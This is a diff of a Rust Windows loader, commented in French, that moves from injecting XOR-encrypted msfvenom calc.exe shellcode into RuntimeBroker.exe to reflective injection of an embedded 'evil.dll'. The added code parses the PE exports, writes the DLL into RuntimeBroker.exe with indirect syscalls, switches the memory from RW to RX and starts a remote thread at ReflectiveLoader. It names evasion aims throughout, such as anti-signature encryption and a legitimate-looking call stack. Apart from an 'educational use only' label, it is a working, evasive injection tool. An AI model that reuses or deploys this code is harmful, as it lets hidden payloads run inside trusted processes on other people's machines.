@@ -1,23 +1,26 @@
 /*
     ============================================================
-    🦀 CALC LOADER v4 - Process Injection into RuntimeBroker.exe
+    🦀 REFLECTIVE DLL LOADER v5 - ReflectiveLdr Edition
     ============================================================
 
     Ce loader démontre les concepts suivants:
-    1. 100% Direct/Indirect Syscalls (aucun appel kernel32/ntdll via IAT)
-    2. Process Injection dans RuntimeBroker.exe (process existant)
-    3. XOR encryption du shellcode (anti-signature)
-    4. Protection mémoire RW→RX (pas de RWX!)
+    1. Reflective DLL Injection (ReflectiveLdr)
+    2. PE Parsing pour trouver l'export ReflectiveLoader
+    3. Indirect Syscalls (call stack légitime)
+    4. Process Injection dans RuntimeBroker.exe
     5. Droits minimum (0x002A, pas PROCESS_ALL_ACCESS!)
 
-    Flow v4:
-    1. Énumération des processes pour trouver RuntimeBroker.exe
-    2. NtOpenProcess avec droits minimum
-    3. NtAllocateVirtualMemory (remote, RW)
-    4. NtWriteVirtualMemory (full syscall!)
-    5. NtProtectVirtualMemory (RW→RX)
-    6. NtCreateThreadEx (remote thread)
-    7. NtClose pour cleanup
+    Flow v5:
+    1. Lire la DLL reflective (include_bytes!)
+    2. Parser le PE pour trouver l'offset de ReflectiveLoader
+    3. Énumération des processes pour trouver RuntimeBroker.exe
+    4. NtOpenProcess avec droits minimum
+    5. NtAllocateVirtualMemory (remote, RW)
+    6. NtWriteVirtualMemory (copie la DLL entière)
+    7. NtProtectVirtualMemory (RW→RX)
+    8. NtCreateThreadEx (remote thread → ReflectiveLoader)
+    9. ReflectiveLoader mappe la DLL → DllMain → Payload!
+    10. NtClose pour cleanup
 
     ⚠️  USAGE ÉDUCATIF UNIQUEMENT
 
@@ -49,33 +52,10 @@ const PROCESS_VM_WRITE: u32 = 0x0020;
 const MINIMUM_ACCESS: u32 = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE; // 0x002A
 
 // ============================================================
-// CONFIGURATION XOR
+// REFLECTIVE DLL (compilée avec ReflectiveLdr)
+// Contient l'export ReflectiveLoader
 // ============================================================
-const XOR_KEY: [u8; 4] = [0xDE, 0xAD, 0xBE, 0xEF];
-
-/// Shellcode CHIFFRÉ pour lancer calc.exe (Windows x64)
-/// Original: msfvenom -p windows/x64/exec CMD=calc.exe -f rust
-/// Puis XORé avec la clé [0xDE, 0xAD, 0xBE, 0xEF]
-const ENCRYPTED_SHELLCODE: [u8; 276] = [
-    0x22, 0xe5, 0x3d, 0x0b, 0x2e, 0x45, 0x7e, 0xef, 0xde, 0xad, 0xff, 0xbe, 0x9f, 0xfd, 0xec, 0xbe,
-    0x88, 0xe5, 0x8f, 0x3d, 0xbb, 0xe5, 0x35, 0xbd, 0xbe, 0xe5, 0x35, 0xbd, 0xc6, 0xe5, 0x35, 0xbd,
-    0xfe, 0xe5, 0x35, 0x9d, 0x8e, 0xe5, 0xb1, 0x58, 0x94, 0xe7, 0xf3, 0xde, 0x17, 0xe5, 0x8f, 0x2f,
-    0x72, 0x91, 0xdf, 0x93, 0xdc, 0x81, 0x9e, 0xae, 0x1f, 0x64, 0xb3, 0xae, 0xdf, 0x6c, 0x5c, 0x02,
-    0x8c, 0xec, 0xef, 0xa7, 0x55, 0xff, 0x9e, 0x64, 0x9c, 0x91, 0xf6, 0xee, 0x0e, 0x26, 0x3e, 0x67,
-    0xde, 0xad, 0xbe, 0xa7, 0x5b, 0x6d, 0xca, 0x88, 0x96, 0xac, 0x6e, 0xbf, 0x55, 0xe5, 0xa6, 0xab,
-    0x55, 0xed, 0x9e, 0xa6, 0xdf, 0x7d, 0x5d, 0xb9, 0x96, 0x52, 0x77, 0xae, 0x55, 0x99, 0x36, 0xa7,
-    0xdf, 0x7b, 0xf3, 0xde, 0x17, 0xe5, 0x8f, 0x2f, 0x72, 0xec, 0x7f, 0x26, 0xd3, 0xec, 0xbf, 0x2e,
-    0xe6, 0x4d, 0xcb, 0x1e, 0x92, 0xae, 0xf2, 0xcb, 0xd6, 0xe8, 0x87, 0x3e, 0xab, 0x75, 0xe6, 0xab,
-    0x55, 0xed, 0x9a, 0xa6, 0xdf, 0x7d, 0xd8, 0xae, 0x55, 0xa1, 0xf6, 0xab, 0x55, 0xed, 0xa2, 0xa6,
-    0xdf, 0x7d, 0xff, 0x64, 0xda, 0x25, 0xf6, 0xee, 0x0e, 0xec, 0xe6, 0xae, 0x86, 0xf3, 0xe7, 0xb5,
-    0x9f, 0xf5, 0xff, 0xb6, 0x9f, 0xf7, 0xf6, 0x6c, 0x32, 0x8d, 0xff, 0xbd, 0x21, 0x4d, 0xe6, 0xae,
-    0x87, 0xf7, 0xf6, 0x64, 0xcc, 0x44, 0xe9, 0x10, 0x21, 0x52, 0xe3, 0xa7, 0x64, 0xac, 0xbe, 0xef,
-    0xde, 0xad, 0xbe, 0xef, 0xde, 0xe5, 0x33, 0x62, 0xdf, 0xac, 0xbe, 0xef, 0x9f, 0x17, 0x8f, 0x64,
-    0xb1, 0x2a, 0x41, 0x3a, 0x65, 0x5d, 0x0b, 0x4d, 0x88, 0xec, 0x04, 0x49, 0x4b, 0x10, 0x23, 0x10,
-    0x0b, 0xe5, 0x3d, 0x2b, 0xf6, 0x91, 0xb8, 0x93, 0xd4, 0x2d, 0x45, 0x0f, 0xab, 0xa8, 0x05, 0xa8,
-    0xcd, 0xdf, 0xd1, 0x85, 0xde, 0xf4, 0xff, 0x66, 0x04, 0x52, 0x6b, 0x8c, 0xbf, 0xc1, 0xdd, 0xc1,
-    0xbb, 0xd5, 0xdb, 0xef,
-];
+const DLL_BYTES: &[u8] = include_bytes!("../../reflective_dll/evil.dll");
 
 // ============================================================
 // STRUCTURES POUR NtOpenProcess
@@ -87,14 +67,230 @@ struct ClientId {
 }
 
 // ============================================================
-// FONCTION XOR
+// STRUCTURES PE POUR PARSER LES EXPORTS
 // ============================================================
-fn xor_decrypt(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
-    encrypted
-        .iter()
-        .enumerate()
-        .map(|(i, byte)| byte ^ key[i % key.len()])
-        .collect()
+#[repr(C)]
+struct DosHeader {
+    e_magic: u16,
+    _padding: [u8; 58],
+    e_lfanew: u32,
+}
+
+#[repr(C)]
+struct NtHeaders64 {
+    signature: u32,
+    file_header: FileHeader,
+    optional_header: OptionalHeader64,
+}
+
+#[repr(C)]
+struct FileHeader {
+    machine: u16,
+    number_of_sections: u16,
+    time_date_stamp: u32,
+    pointer_to_symbol_table: u32,
+    number_of_symbols: u32,
+    size_of_optional_header: u16,
+    characteristics: u16,
+}
+
+#[repr(C)]
+struct OptionalHeader64 {
+    magic: u16,
+    major_linker_version: u8,
+    minor_linker_version: u8,
+    size_of_code: u32,
+    size_of_initialized_data: u32,
+    size_of_uninitialized_data: u32,
+    address_of_entry_point: u32,
+    base_of_code: u32,
+    image_base: u64,
+    section_alignment: u32,
+    file_alignment: u32,
+    major_os_version: u16,
+    minor_os_version: u16,
+    major_image_version: u16,
+    minor_image_version: u16,
+    major_subsystem_version: u16,
+    minor_subsystem_version: u16,
+    win32_version_value: u32,
+    size_of_image: u32,
+    size_of_headers: u32,
+    checksum: u32,
+    subsystem: u16,
+    dll_characteristics: u16,
+    size_of_stack_reserve: u64,
+    size_of_stack_commit: u64,
+    size_of_heap_reserve: u64,
+    size_of_heap_commit: u64,
+    loader_flags: u32,
+    number_of_rva_and_sizes: u32,
+    data_directories: [DataDirectory; 16],
+}
+
+#[repr(C)]
+#[derive(Copy, Clone)]
+struct DataDirectory {
+    virtual_address: u32,
+    size: u32,
+}
+
+#[repr(C)]
+struct SectionHeader {
+    name: [u8; 8],
+    virtual_size: u32,
+    virtual_address: u32,
+    size_of_raw_data: u32,
+    pointer_to_raw_data: u32,
+    pointer_to_relocations: u32,
+    pointer_to_linenumbers: u32,
+    number_of_relocations: u16,
+    number_of_linenumbers: u16,
+    characteristics: u32,
+}
+
+#[repr(C)]
+struct ExportDirectory {
+    characteristics: u32,
+    time_date_stamp: u32,
+    major_version: u16,
+    minor_version: u16,
+    name: u32,
+    base: u32,
+    number_of_functions: u32,
+    number_of_names: u32,
+    address_of_functions: u32,
+    address_of_names: u32,
+    address_of_name_ordinals: u32,
+}
+
+/// Convertit un RVA en offset fichier
+fn rva_to_offset(rva: u32, sections: &[SectionHeader]) -> Option<u32> {
+    for section in sections {
+        let section_start = section.virtual_address;
+        let section_end = section_start + section.virtual_size;
+
+        if rva >= section_start && rva < section_end {
+            let offset_in_section = rva - section_start;
+            return Some(section.pointer_to_raw_data + offset_in_section);
+        }
+    }
+    None
+}
+
+/// Trouve l'offset de l'export "ReflectiveLoader" dans la DLL
+fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
+    unsafe {
+        println!("[DEBUG] DLL size: {} bytes", dll_bytes.len());
+
+        // 1. DOS Header
+        let dos_header = &*(dll_bytes.as_ptr() as *const DosHeader);
+        if dos_header.e_magic != 0x5A4D {
+            return Err("Invalid DOS header".to_string());
+        }
+        println!(
+            "[DEBUG] DOS header OK, e_lfanew: 0x{:X}",
+            dos_header.e_lfanew
+        );
+
+        // 2. NT Headers
+        let nt_headers =
+            &*(dll_bytes.as_ptr().add(dos_header.e_lfanew as usize) as *const NtHeaders64);
+        if nt_headers.signature != 0x4550 {
+            return Err("Invalid PE signature".to_string());
+        }
+        println!("[DEBUG] PE signature OK");
+        println!(
+            "[DEBUG] Number of sections: {}",
+            nt_headers.file_header.number_of_sections
+        );
+
+        // 3. Get sections
+        let sections_offset = dos_header.e_lfanew as usize
+            + 4  // signature
+            + std::mem::size_of::<FileHeader>()
+            + nt_headers.file_header.size_of_optional_header as usize;
+
+        let sections = std::slice::from_raw_parts(
+            dll_bytes.as_ptr().add(sections_offset) as *const SectionHeader,
+            nt_headers.file_header.number_of_sections as usize,
+        );
+
+        // 4. Export Directory
+        let export_dir_rva = nt_headers.optional_header.data_directories[0].virtual_address;
+        if export_dir_rva == 0 {
+            return Err("No export directory".to_string());
+        }
+        println!("[DEBUG] Export dir RVA: 0x{:X}", export_dir_rva);
+
+        let export_dir_offset =
+            rva_to_offset(export_dir_rva, sections).ok_or("Failed to convert export dir RVA")?;
+        println!("[DEBUG] Export dir offset: 0x{:X}", export_dir_offset);
+
+        let export_dir =
+            &*(dll_bytes.as_ptr().add(export_dir_offset as usize) as *const ExportDirectory);
+        println!("[DEBUG] Number of names: {}", export_dir.number_of_names);
+
+        // 5. Tables d'export
+        let names_offset = rva_to_offset(export_dir.address_of_names, sections)
+            .ok_or("Failed to convert names RVA")?;
+        let functions_offset = rva_to_offset(export_dir.address_of_functions, sections)
+            .ok_or("Failed to convert functions RVA")?;
+        let ordinals_offset = rva_to_offset(export_dir.address_of_name_ordinals, sections)
+            .ok_or("Failed to convert ordinals RVA")?;
+
+        // 6. Parcourir les exports pour trouver "ReflectiveLoader"
+        for i in 0..export_dir.number_of_names {
+            // Lire le RVA du nom
+            let name_rva_ptr = dll_bytes
+                .as_ptr()
+                .add(names_offset as usize + (i * 4) as usize)
+                as *const u32;
+            let name_rva = *name_rva_ptr;
+
+            // Convertir RVA en offset
+            let name_offset = match rva_to_offset(name_rva, sections) {
+                Some(o) => o,
+                None => continue,
+            };
+
+            // Lire le nom
+            let name_ptr = dll_bytes.as_ptr().add(name_offset as usize);
+            let name = std::ffi::CStr::from_ptr(name_ptr as *const i8)
+                .to_str()
+                .unwrap_or("");
+
+            if name == "ReflectiveLoader" {
+                println!("[DEBUG] Found ReflectiveLoader at index {}", i);
+
+                // Trouver l'ordinal
+                let ordinal_ptr = dll_bytes
+                    .as_ptr()
+                    .add(ordinals_offset as usize + (i * 2) as usize)
+                    as *const u16;
+                let ordinal = *ordinal_ptr;
+
+                // Trouver le RVA de la fonction
+                let func_rva_ptr = dll_bytes
+                    .as_ptr()
+                    .add(functions_offset as usize + (ordinal as usize * 4))
+                    as *const u32;
+                let func_rva = *func_rva_ptr;
+
+                println!("[DEBUG] Function RVA: 0x{:X}", func_rva);
+
+                // Convertir RVA en offset fichier car on injecte la DLL brute (pas mappée)!
+                let func_offset = rva_to_offset(func_rva, sections)
+                    .ok_or("Failed to convert function RVA to file offset")?;
+
+                println!("[DEBUG] Function file offset: 0x{:X}", func_offset);
+
+                return Ok(func_offset);
+            }
+        }
+
+        Err("ReflectiveLoader export not found".to_string())
+    }
 }
 
 /// Trouve le PID d'un processus par son nom
@@ -110,7 +306,6 @@ fn find_process_pid(target_name: &str) -> Option<u32> {
 
         if Process32FirstW(snapshot, &mut entry) != 0 {
             loop {
-                // Convertir le nom du process en String
                 let name = String::from_utf16_lossy(&entry.szExeFile)
                     .trim_end_matches('\0')
                     .to_lowercase();
@@ -132,30 +327,22 @@ fn find_process_pid(target_name: &str) -> Option<u32> {
     }
 }
 
-/// Injecte le shellcode dans le processus cible (100% syscalls!)
-fn inject_shellcode(target_pid: u32, encrypted_shellcode: &[u8]) -> Result<(), String> {
+/// Injecte la DLL reflective dans le processus cible
+fn inject_reflective_dll(
+    target_pid: u32,
+    dll_bytes: &[u8],
+    loader_offset: u32,
+) -> Result<(), String> {
     println!("[*] Target PID: {}", target_pid);
-
-    // =====================================================
-    // ÉTAPE 1: Déchiffrer le shellcode
-    // =====================================================
-    println!("\n[STEP 1] XOR Decryption");
-    println!("────────────────────────────────────────────");
-
-    let shellcode = xor_decrypt(encrypted_shellcode, &XOR_KEY);
-
-    println!(
-        "[+] Decrypted! First 4 bytes: {:02X} {:02X} {:02X} {:02X}",
-        shellcode[0], shellcode[1], shellcode[2], shellcode[3]
-    );
-    println!("[+] Expected:                 FC 48 83 E4");
+    println!("[*] DLL size: {} bytes", dll_bytes.len());
+    println!("[*] ReflectiveLoader offset: 0x{:X}", loader_offset);
 
     unsafe {
         // =====================================================
-        // ÉTAPE 2: NtOpenProcess (droits minimum 0x002A!)
+        // ÉTAPE 1: NtOpenProcess
         // =====================================================
         println!(
-            "\n[STEP 2] NtOpenProcess (minimum rights: 0x{:04X})",
+            "\n[STEP 1] NtOpenProcess (minimum rights: 0x{:04X})",
             MINIMUM_ACCESS
         );
         println!("────────────────────────────────────────────");
@@ -184,13 +371,13 @@ fn inject_shellcode(target_pid: u32, encrypted_shellcode: &[u8]) -> Result<(), S
         println!("[+] Process handle: {:p}", h_process);
 
         // =====================================================
-        // ÉTAPE 3: NtAllocateVirtualMemory (remote, RW)
+        // ÉTAPE 2: NtAllocateVirtualMemory (remote, RW)
         // =====================================================
-        println!("\n[STEP 3] NtAllocateVirtualMemory (remote, RW)");
+        println!("\n[STEP 2] NtAllocateVirtualMemory (remote, RW)");
         println!("────────────────────────────────────────────");
 
         let mut base_address: *mut c_void = null_mut();
-        let mut region_size: usize = shellcode.len();
+        let mut region_size: usize = dll_bytes.len();
 
         let status: NTSTATUS = syscall!(
             "NtAllocateVirtualMemory",
@@ -210,9 +397,9 @@ fn inject_shellcode(target_pid: u32, encrypted_shellcode: &[u8]) -> Result<(), S
         println!("[+] Remote memory at: {:p}", base_address);
 
         // =====================================================
-        // ÉTAPE 4: NtWriteVirtualMemory (FULL SYSCALL!)
+        // ÉTAPE 3: NtWriteVirtualMemory (copie la DLL entière)
         // =====================================================
-        println!("\n[STEP 4] NtWriteVirtualMemory (full syscall!)");
+        println!("\n[STEP 3] NtWriteVirtualMemory (copy entire DLL)");
         println!("────────────────────────────────────────────");
 
         let mut bytes_written: usize = 0;
@@ -221,8 +408,8 @@ fn inject_shellcode(target_pid: u32, encrypted_shellcode: &[u8]) -> Result<(), S
             "NtWriteVirtualMemory",
             h_process,
             base_address,
-            shellcode.as_ptr() as *const c_void,
-            shellcode.len(),
+            dll_bytes.as_ptr() as *const c_void,
+            dll_bytes.len(),
             &mut bytes_written as *mut usize
         );
 
@@ -234,14 +421,14 @@ fn inject_shellcode(target_pid: u32, encrypted_shellcode: &[u8]) -> Result<(), S
         println!("[+] Written {} bytes to remote process", bytes_written);
 
         // =====================================================
-        // ÉTAPE 5: NtProtectVirtualMemory (RW → RX)
+        // ÉTAPE 4: NtProtectVirtualMemory (RW → RX)
         // =====================================================
-        println!("\n[STEP 5] NtProtectVirtualMemory (RW → RX)");
+        println!("\n[STEP 4] NtProtectVirtualMemory (RW → RX)");
         println!("────────────────────────────────────────────");
 
         let mut old_protect: u32 = 0;
         let mut protect_addr = base_address;
-        let mut protect_size = shellcode.len();
+        let mut protect_size = dll_bytes.len();
 
         let status: NTSTATUS = syscall!(
             "NtProtectVirtualMemory",
@@ -263,9 +450,20 @@ fn inject_shellcode(target_pid: u32, encrypted_shellcode: &[u8]) -> Result<(), S
         );
 
         // =====================================================
-        // ÉTAPE 6: NtCreateThreadEx (remote thread)
+        // ÉTAPE 5: Calculer l'adresse de ReflectiveLoader
         // =====================================================
-        println!("\n[STEP 6] NtCreateThreadEx (remote thread)");
+        println!("\n[STEP 5] Calculate ReflectiveLoader address");
+        println!("────────────────────────────────────────────");
+
+        let loader_address = (base_address as usize + loader_offset as usize) as *mut c_void;
+        println!("[+] Base address:        {:p}", base_address);
+        println!("[+] Loader offset:       0x{:X}", loader_offset);
+        println!("[+] Loader address:      {:p}", loader_address);
+
+        // =====================================================
+        // ÉTAPE 6: NtCreateThreadEx (remote thread → ReflectiveLoader)
+        // =====================================================
+        println!("\n[STEP 6] NtCreateThreadEx (start ReflectiveLoader)");
         println!("────────────────────────────────────────────");
 
         let mut thread_handle: *mut c_void = null_mut();
@@ -276,8 +474,8 @@ fn inject_shellcode(target_pid: u32, encrypted_shellcode: &[u8]) -> Result<(), S
             0x1FFFFFu32,
             NULL,
             h_process,
-            base_address,
-            NULL,
+            loader_address, // ← Démarre à ReflectiveLoader, pas au début de la DLL!
+            base_address,   // ← Passe l'adresse de base en paramètre
             0u32,
             0usize,
             0usize,
@@ -291,10 +489,10 @@ fn inject_shellcode(target_pid: u32, encrypted_shellcode: &[u8]) -> Result<(), S
         }
 
         println!("[+] Remote thread created: {:p}", thread_handle);
-        println!("[+] Shellcode executing in RuntimeBroker.exe!");
+        println!("[+] ReflectiveLoader executing...");
 
         // =====================================================
-        // ÉTAPE 7: NtClose (cleanup avec syscalls!)
+        // ÉTAPE 7: NtClose (cleanup)
         // =====================================================
         println!("\n[STEP 7] NtClose (cleanup)");
         println!("────────────────────────────────────────────");
@@ -312,13 +510,14 @@ fn main() {
     println!(
         r#"
     ╔═══════════════════════════════════════════════════════════╗
-    ║  🦀 CALC LOADER v4 - RuntimeBroker.exe Injection Edition 🦀    ║
+    ║  🦀 REFLECTIVE DLL LOADER v5 - ReflectiveLdr Edition 🦀  ║
     ║                                                           ║
     ║  Techniques:                                              ║
-    ║  ✓ Process injection into existing RuntimeBroker.exe           ║
-    ║  ✓ Full syscalls (NtWriteVirtualMemory, NtClose)         ║
-    ║  ✓ Minimum rights (0x002A, not PROCESS_ALL_ACCESS!)      ║
-    ║  ✓ XOR encrypted shellcode                               ║
+    ║  ✓ Reflective DLL Injection (ReflectiveLdr)              ║
+    ║  ✓ PE Parsing (find ReflectiveLoader export)             ║
+    ║  ✓ Process injection into existing RuntimeBroker.exe     ║
+    ║  ✓ Indirect syscalls                                      ║
+    ║  ✓ Minimum rights (0x002A)                               ║
     ║  ✓ RW → RX memory protection                             ║
     ║                                                           ║
     ║  Syscalls used:                                           ║
@@ -331,25 +530,46 @@ fn main() {
     "#
     );
 
-    // Étape 1: Trouver RuntimeBroker.exe
-    println!("[*] Searching for RuntimeBroker.exe...");
+    // =========================================================
+    // ÉTAPE 1: Parser la DLL pour trouver ReflectiveLoader
+    // =========================================================
+    println!("[*] Parsing DLL to find ReflectiveLoader export...");
+
+    let loader_offset = match find_reflective_loader_offset(DLL_BYTES) {
+        Ok(offset) => {
+            println!("[+] Found ReflectiveLoader at offset: 0x{:X}", offset);
+            offset
+        }
+        Err(e) => {
+            eprintln!("[✗] Failed to parse DLL: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    // =========================================================
+    // ÉTAPE 2: Trouver RuntimeBroker.exe
+    // =========================================================
+    println!("\n[*] Searching for RuntimeBroker.exe...");
 
     let pid = match find_process_pid("RuntimeBroker.exe") {
         Some(pid) => pid,
         None => {
             eprintln!("[✗] RuntimeBroker.exe not found!");
-            eprintln!("[*] Tip: Open a folder with thumbnails to spawn RuntimeBroker.exe");
+            eprintln!("[*] Tip: Open Windows Settings to spawn RuntimeBroker.exe");
             std::process::exit(1);
         }
     };
 
     println!("[+] Found RuntimeBroker.exe with PID: {}", pid);
 
-    // Étape 2: Injecter le shellcode
-    match inject_shellcode(pid, &ENCRYPTED_SHELLCODE) {
+    // =========================================================
+    // ÉTAPE 3: Injecter la DLL reflective
+    // =========================================================
+    match inject_reflective_dll(pid, DLL_BYTES, loader_offset) {
         Ok(_) => {
             println!("\n════════════════════════════════════════════");
-            println!("[✓] SUCCESS: Calc launched from RuntimeBroker.exe!");
+            println!("[✓] SUCCESS: Reflective DLL injected!");
+            println!("[✓] ReflectiveLoader → DllMain → Payload executed!");
             println!("════════════════════════════════════════════");
         }
         Err(e) => {
